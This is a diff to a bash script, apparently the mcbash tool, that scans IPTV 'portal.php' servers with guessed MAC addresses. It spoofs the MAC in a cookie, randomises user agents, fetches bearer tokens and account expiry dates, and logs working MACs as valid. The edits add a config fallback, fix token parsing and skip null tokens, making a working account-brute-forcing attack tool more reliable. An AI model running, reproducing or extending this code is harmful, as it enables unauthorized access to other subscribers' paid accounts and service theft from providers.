@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 #
 
 _RED=$(tput setaf 1)
@@ -20,7 +20,11 @@ config_file=$HOME/.mcbash/mcbash.conf
 if [[ -f $config_file ]]; then
 	source "$config_file"
 else
-	echo -e "Config file not found.\nmcbash.conf should be placed here : $config_file"
+	if [[ -f "/etc/mcbash.conf" ]]; then
+		source "/etc/mcbash.conf"
+	else
+		echo -e "Config file not found.\nmcbash.conf should be placed here : $config_file"
+	fi
 fi
 
 [ -d $destination ] || mkdir -p "$destination" &> /dev/null || \
@@ -219,8 +223,9 @@ handshaking() {
 	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam; "
 	random_user_agent
 	handshake_token=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then echo -ne "\r\033[0KTimeout. Server may protect against flood (we respect it). New attempt in $timebreak_duration seconds." && sleep $timebreak_duration && echo -ne "\r\033[0KNew attempt..." && return; fi
-	handshake_token=$(echo $handshake_token| grep -o '\"token\".*' | sed 's/\"token\":// ; s/\}\}//')
+	handshake_token=$(echo $handshake_token| grep -o '"token".*' | sed 's/\"token\":// ; s/\}\}//')
 	[[ $handshake_token = "" ]] && echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" && return # [vide]
+	[[ $(echo $handshake_token | grep null) ]] && echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" && return # [vide]
 	authorization='Bearer '$(echo $handshake_token)
 	profile_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
 	profile=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
@@ -228,8 +233,9 @@ handshaking() {
 	[[ $expiration_date == "" ]] && \
 		( ( [[ ! -v keep_expired ]] && echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}" && return ) || \
 			( echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n" && \
+			name=$(echo $dns | sed 's/http:\/\///' | sed 's/://;s/\///') && \
 			echo "$mac [expired]" >> $destination/valid_macs_$name ) )
-	name=$(echo $dns | sed 's/http:\/\///' | sed 's/://')
+	name=$(echo $dns | sed 's/http:\/\///' | sed 's/://;s/\///')
 	[[ $valid_macs_number == 0 ]] && echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
 	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
 	echo -ne "\r${_BOLD}${_GREEN}[$item] $mac [VALID!] ${_RESET}\n"
@@ -282,3 +288,4 @@ done
 
 # dougy147 [2022]
 # https://github.com/dougy147/mcbash
+# last updated : 28.09.2022
